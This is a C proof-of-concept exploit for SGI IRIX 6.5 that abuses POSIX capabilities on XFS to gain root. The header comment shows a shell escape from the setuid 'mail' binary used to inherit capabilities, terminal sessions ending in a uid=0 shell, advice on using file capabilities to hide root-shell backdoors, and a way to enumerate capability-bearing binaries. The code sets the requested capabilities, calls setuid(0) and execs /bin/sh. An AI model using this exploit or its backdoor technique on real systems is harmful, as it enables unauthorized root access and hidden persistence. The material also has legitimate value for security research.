/* SGI IRIX <= 6.5.x capability hijacking "eip" PoC (SGI XFS)
 * ==========================================================
 * SGI IRIX implements both a SUPERUSER (BSD 'su') security model
 * with POSIX1003.6D14. This adds "capabilities" which are also
 * SGI XFS file system attributes for privilege assignment.
 * POSIX1003.6D14 capabilities  definition allows for more than just uid/gid
 * type assignment. Capabilities can be used to get privileges with
 * "cap_accquire" etc. - they are stored in memory with your "u_cred"
 * structure much like the regular BSD security model implementations.
 *
 * There are many capabilities defined in "sys/capabilities.h" and
 * on man capabilities(4). Capabilities are super user delegated
 * tasks but include stuff like "CAP_SETUID" to call setuid();
 * even if file has no "sticky bit" under BSD UNIX such as in "UFS"
 * filing system or ext3 for instance. SGI XFS supports attributes
 * (attr for labels) and capabilities (chcap). so do processes.
 *
 * to view SGI capabilities of a process use "ps -alP" or do
 * "ls -alP" on the file. lets demo how to steal some capabilities.
 *
 *  $ id;ls -alP `which mail`
 *  uid=993(demos) gid=997(demos)
 *  -rwsr-sr-x    1 root     mail       60604 Dec 31  1999 /usr/bin/mail []
 *  $ ls -alP captest /usr/sbin/dmplay
 *  -rwxr-xr-x    1 demos    demos      21040 May  1 20:58 captest []
 *  -rwsr-xr-x    1 root     sys        82756 Dec 31  1999 /usr/sbin/dmplay
 *  [all= CAP_SCHED_MGT+epi]
 *
 * we can see "mail" binary has empty capabilities [] but is setuid root / mail.
 * we can also see that "dmplay" has some SGI XFS capabilities set. Processes
 * can accquire capabilities and drop them using library function calls. "mail"
 * does this as it drops the setuid root permissions and enables / disposes of
 * capabilities as it needs them. Lots of SGI IRIX processes use capabilities
 * to specifically request ability such as loading kernel modules in (ml). This
 * code can be used to test setting capabilities and to output capabilities.
 *
 *  $ ./captest ALL+eip
 *  set capabilities -1
 *  effective capabilities 0
 *  permitted capabilities 0
 *  inheritable capabilities 0
 *
 * here is unprivileged process requesting MAXIMUM CAPABILITIES. error -1.
 * we then output our "cap_t" structure which is really just three uint_64t
 * values (e)ffective (p)permitted and (i)hereitable - eip - which can be passed
 * onto child processes.
 *
 * our current process therefore can have "e i p" capabilities set, currently it's
 * an empty set. A process can "request" or "acquire" capabilities for its use
 * via cap_accquire etc. "mail" is setuid root and will drop traditional privileges
 * yet our capabilities structure (cap_t) is inherited by child. hacking or becoming
 * child process of capability aware binary can result in escalation paths.
 *
 *  $ mail -f mail ## run !sh to escape from mail to a vfork() shell
 *  From root@IRIS.lan Tue Apr 30 23:03:19 2019
 *  Return-Path: <root@IRIS.lan>
 *  Received: from IRIS.lan (localhost.lan [127.0.0.1])
 *         by IRIS.lan (SGI-8.12.5/8.12.5) with ESMTP id x4163JbG003552
 *       for <demos@IRIS.lan>; Tue, 30 Apr 2019 23:03:19 -0700 (PDT)
 *  ? !sh
 *
 * now run captest.c again....
 *
 *  $ ./captest 
 *  effective capabilities 0
 *  permitted capabilities 0
 *  inheritable capabilities 8000000000000000
 *  $
 *
 * Notice our inheritable capabilities have now changed to a uint_64t. the
 * MSB cap_t struct holds numerous potential capabilities and flags. here is
 * what output is when a process is given CAP_SETUID capability (there are many 
 * others to explore). 
 *
 *  IRIS 1% ./captest
 *  effective capabilities 800
 *  permitted capabilities 800
 *  inheritable capabilities 8000000000000000
 *  IRIS 2%
 *
 * SGI XFS supports setting capabliities on files too, so you can use them
 * as a backdoor and hide in the system many ways. SGI_SETPCAP lets you get
 * any other capability you want. Example above showed inheritence issues, lets 
 * change our captest capabilities now using "chcap".
 *
 *  $ id;uname -a
 *  uid=993(demos) gid=997(demos)
 *  IRIX IRIS 6.5 10070055 IP22
 *  $ ls -alP captest
 *  -rwxr-xr-x    1 demos    demos      21260 May  2 19:30 captest [all= CAP_SETUID+pi]
 *  $./irix-captest
 *  effective capabilities 0
 *  permitted capabilities 800
 *  inheritable capabilities 0
 *  $ ./irix-captest ALL+eip
 *  req effective capabilities ffffffffffffffe
 *  req permitted capabilities ffffffffffffffe
 *  req inheritable caps ffffffffffffffe
 *  set capabilities result -1
 *  effective capabilities 0
 *  permitted capabilities 800
 *  inheritable capabilities 0
 *  $ ./irix-captest CAP_SETUID+e
 *  req effective capabilities 800
 *  req permitted capabilities 0
 *  req inheritable caps 0
 *  set capabilities result 0
 *  effective capabilities 800
 *  permitted capabilities 0
 *  inheritable capabilities 0
 *  # id
 *  uid=0(root) gid=0(sys)
 *
 * Congratulations, you read to the end and can see how we can abuse capabliities
 * on SGI XFS file systems to hide root shells and find other privileged software 
 * like mail to exploit. Capabilities are enabled by default in SGI IRIX, yet 
 * configuration required to be fully used (and increase the attack surface!)
 * here is how to find all the binaries with capabliities set in SGI XFS and
 * running processes - use "ls -alP /proc" or cat the "irix.cap" file.
 *
 *  $ cat /etc/irix.cap // you will get 131 files show each kind of priviilege.
 *  -cap='all= CAP_MAC_READ,CAP_DAC_READ_SEARCH+ip CAP_PRIV_PORT,CAP_MAC_MLD,
 *  CAP_MAC_RELABEL_SUBJ,CAP_DAC_WRITE+p CAP_MAC_RELABEL_OPEN,CAP_FOWNER,
 *  CAP_MAC_DOWNGRADE,CAP_MAC_UPGRADE,CAP_MAC_WRITE,CAP_DEVICE_MGT,
 *  CAP_DAC_EXECUTE+i' sbin/chlabel
 *  -cap='all= CAP_SYSINFO_MGT+i' sbin/xvminit
 *
 * You can run this PoC utility to obtain inheritable privileges either from a
 * a privileged parent process or via SGI XFS file system capabilities.
 *
 *   Happy Hacking
 * -- HackerFantastic
 *    (https://hacker.house)
 */
#include <stdio.h>
#include <stdlib.h>
#include <capability.h>
#include <sys/capability.h>


int main(int argc, char* argv[]){
        int ret;
        cap_t cap, newcap;
        char* argp[]={"sh","-p",0};
        char* envp[]={"",0};
        if(argc > 1){
                // e.g. ALL+eip see man page for more
                newcap = cap_from_text(argv[1]);
                if(newcap){
                        printf("req effective capabilities %llx\n",newcap->cap_effective);
                        printf("req permitted capabilities %llx\n",newcap->cap_permitted);
                        printf("req inheritable caps %llx\n", newcap->cap_inheritable);
                        ret = cap_set_proc(newcap);
                        printf("set capabilities result %d\n",ret);
                } else {
                        printf("requested invalid capabilites\n");
                }
        }
        cap = cap_get_proc();
        printf("effective capabilities %llx\n",cap->cap_effective);
        printf("permitted capabilities %llx\n",cap->cap_permitted);
        printf("inheritable capabilities %llx\n",cap->cap_inheritable);
        if(argc > 1 && ret == 0){
          // you obtained the capabilities you asked for, presume CAP_SETUID
          setuid(0);
          setgid(0);
          execve("/bin/sh",argp,envp);
        }
}
